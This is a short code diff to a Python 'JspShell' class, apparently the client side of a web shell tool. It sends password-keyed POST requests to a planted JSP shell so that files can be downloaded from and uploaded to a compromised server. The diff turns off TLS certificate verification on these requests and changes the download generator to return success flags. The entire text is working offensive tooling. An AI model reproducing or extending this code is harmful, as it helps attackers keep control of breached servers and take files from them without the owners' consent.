@@ -39,7 +39,7 @@ class JspShell:
     def __sendRequests(self,payload):
         response=None
         try:
-            response= requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
+            response= requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload, verify=False)
         except Exception as e:
             log.e(str(e))
         return response
@@ -68,12 +68,12 @@ class JspShell:
     def downloadFile(self,path):
         chunk_size = 1024
         payload = {self.shellEntity.shell_password: 'F', 'z1': path, 'z0': self.shellEntity.shell_encode_type}
-        response = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload,stream=True)
+        response = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload,stream=True,verify=False)
         if response.status_code==200:
             for data in response.iter_content(chunk_size=chunk_size):
-                yield data
+                yield True,data
         else:
-            yield response
+            yield False,response
 
     def uploadFile(self,path,hexString):
         payload = {self.shellEntity.shell_password: 'G', 'z1': path, 'z0': self.shellEntity.shell_encode_type,
